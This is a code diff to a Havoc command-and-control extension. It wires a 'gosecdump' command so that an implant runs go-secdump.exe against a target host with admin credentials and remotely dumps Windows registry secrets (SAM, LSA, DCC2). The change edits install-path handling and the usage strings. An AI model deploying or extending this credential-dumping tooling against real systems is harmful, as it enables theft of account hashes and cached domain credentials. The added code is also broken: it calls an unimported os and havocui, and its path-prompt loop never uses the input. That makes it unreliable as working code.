@@ -1,7 +1,14 @@
 from havoc import Demon, RegisterCommand
 from os import path
 
-AGENT_BIN = "/home/havoc/Documents/tools/Havoc/data/extensions/havoc-gosecdump/gosecdump/go-secdump.exe"
+gosecdump_current_dir = os.getcwd()
+gosecdump_install_path = "/data/extensions/havoc-gosecdump/"
+while not os.path.exists(gosecdump_current_dir + gosecdump_install_path):
+    # not installed through havoc-store so prompt for the path
+    gosecdump_install_path = ""
+    havocui.inputdialog("Install path", "Please enter your install path here for the module to work correctly:")
+AGENT_BIN = gosecdump_current_dir + gosecdump_install_path + "go-secdump.exe"
+
 def gosecdump(demonID, *param):
     TaskID : str    = None
     demon  : Demon  = None
@@ -12,7 +19,7 @@ def gosecdump(demonID, *param):
     if len(param) < 4:
         demon.ConsoleWrite(
             demon.CONSOLE_ERROR,
-            "Not enough arguments please set host, username, password and dump target",
+            "Not enough arguments please set host, username, password and --lsa/--sam/--dcc2",
         )
         return False
 
@@ -37,4 +44,4 @@ def gosecdump(demonID, *param):
 
     return TaskID
 
-RegisterCommand(gosecdump, "", "gosecdump", "Tool to remotely dump secrets from the Windows registry (SAM,LSA, DCC2)", 4, "[exploit] (args)", "")
+RegisterCommand(gosecdump, "", "gosecdump", "Tool to remotely dump secrets from the Windows registry (SAM,LSA, DCC2)", 4, "Target Admin-user Admin-password --sam/--lsa/--dcc2 (args)", "")
